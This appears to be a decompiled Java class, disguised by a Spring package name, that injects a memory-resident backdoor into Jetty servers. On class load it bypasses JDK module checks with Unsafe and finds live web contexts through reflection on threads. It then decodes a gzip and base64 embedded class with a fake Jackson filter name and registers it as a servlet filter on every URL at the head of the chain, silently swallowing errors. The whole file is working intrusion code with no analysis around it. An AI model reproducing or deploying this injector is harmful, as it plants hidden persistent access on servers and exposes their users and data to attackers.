package org.springframework.expression;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;

/* loaded from: Test.class */
public class Test {
    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "com.fasterxml.jackson.ServletContextLgxcjxFilter";
    }

    public String getBase64String() throws IOException {
        return new String("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");
    }

    public void bypassJDKModule() {
        try {
            Field declaredField = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            declaredField.setAccessible(true);
            Object obj = declaredField.get(null);
            Object invoke = Class.class.getMethod("getModule", new Class[0]).invoke(Object.class, (Object[]) null);
            obj.getClass().getMethod("getAndSetObject", Object.class, Long.TYPE, Object.class).invoke(obj, getClass(), obj.getClass().getMethod("objectFieldOffset", Field.class).invoke(obj, Class.class.getDeclaredField("module")), invoke);
        } catch (Exception e) {
        }
    }

    static {
        new Test();
    }

    public Test() {
        bypassJDKModule();
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception e) {
        }
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        }
        return className;
    }

    public void addFilter(Object context, Object magicFilter) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, UnsupportedEncodingException {
        String filterName = getFilterName(getClassName());
        Class filterClass = magicFilter.getClass();
        try {
            Object servletHandler = getFV(context, "_servletHandler");
            if (isInjected(servletHandler, filterClass.getName())) {
                return;
            }
            Class filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");
            Constructor constructor = filterHolderClass.getConstructor(Class.class);
            Object filterHolder = constructor.newInstance(filterClass);
            invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, Integer.TYPE}, new Object[]{filterHolder, getUrlPattern(), 1});
            Object filterMaps = getFV(servletHandler, "_filterMappings");
            Object[] tmpFilterMaps = new Object[Array.getLength(filterMaps)];
            int n = 1;
            for (int i = 0; i < Array.getLength(filterMaps); i++) {
                Object filter = Array.get(filterMaps, i);
                String _filterName = (String) getFV(filter, "_filterName");
                if (_filterName.contains(filterClass.getName())) {
                    tmpFilterMaps[0] = filter;
                } else {
                    tmpFilterMaps[n] = filter;
                    n++;
                }
            }
            for (int j = 0; j < tmpFilterMaps.length; j++) {
                Array.set(filterMaps, j, tmpFilterMaps[j]);
            }
            invokeMethod(servletHandler, "invalidateChainsCache");
        } catch (Exception e) {
        }
    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList<>();
        Thread[] threads = (Thread[]) Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = getContextClassLoader(thread);
                if (isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
                } else if (isHttpConnection(thread)) {
                    contexts.add(getContextFromHttpConnection(thread));
                }
            } catch (Exception e) {
            }
        }
        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFV(classLoader, "_context");
        Object handler = getFV(context, "_servletHandler");
        return getFV(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object httpConnection;
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); i++) {
            Object entry = Array.get(table, i);
            if (entry != null && (httpConnection = getFV(entry, "value")) != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                return true;
            }
        }
        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object httpConnection;
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); i++) {
            Object entry = Array.get(table, i);
            if (entry != null && (httpConnection = getFV(entry, "value")) != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                Object request = invokeMethod(httpChannel, "getRequest");
                Object session = invokeMethod(request, "getSession");
                Object servletContext = invokeMethod(session, "getServletContext");
                return getFV(servletContext, "this$0");
            }
        }
        throw new Exception("HttpConnection not found");
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            filter = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, Integer.valueOf(clazzByte.length));
                filter = clazz.newInstance();
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }
        return filter;
    }

    public static boolean isInjected(Object servletHandler, String filterClassName) throws Exception {
        try {
            Object filterMaps = getFV(servletHandler, "_filterMappings");
            for (int i = 0; i < Array.getLength(filterMaps); i++) {
                Object filter = Array.get(filterMaps, i);
                String filterName = (String) getFV(filter, "_filterName");
                if (filterName.contains(filterClassName)) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception e) {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        while (true) {
            int n = ungzip.read(buffer);
            if (n >= 0) {
                out.write(buffer, 0, n);
            } else {
                return out.toByteArray();
            }
        }
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> cls = obj.getClass();
        while (true) {
            Class<?> clazz = cls;
            if (clazz != null) {
                try {
                    Field field = clazz.getDeclaredField(fieldName);
                    field.setAccessible(true);
                    return field;
                } catch (NoSuchFieldException e) {
                    cls = clazz.getSuperclass();
                }
            } else {
                throw new NoSuchFieldException(fieldName);
            }
        }
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class) obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            if (paramClazz == null) {
                try {
                    Method[] methods = tempClass.getDeclaredMethods();
                    int i = 0;
                    while (true) {
                        if (i < methods.length) {
                            if (!methods[i].getName().equals(methodName) || methods[i].getParameterTypes().length != 0) {
                                i++;
                            } else {
                                method = methods[i];
                                break;
                            }
                        } else {
                            break;
                        }
                    }
                } catch (NoSuchMethodException e) {
                    tempClass = tempClass.getSuperclass();
                }
            } else {
                method = tempClass.getDeclaredMethod(methodName, paramClazz);
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e2) {
                throw new RuntimeException(e2.getMessage());
            }
        }
        try {
            return method.invoke(obj, param);
        } catch (IllegalAccessException e3) {
            throw new RuntimeException(e3.getMessage());
        }
    }
}
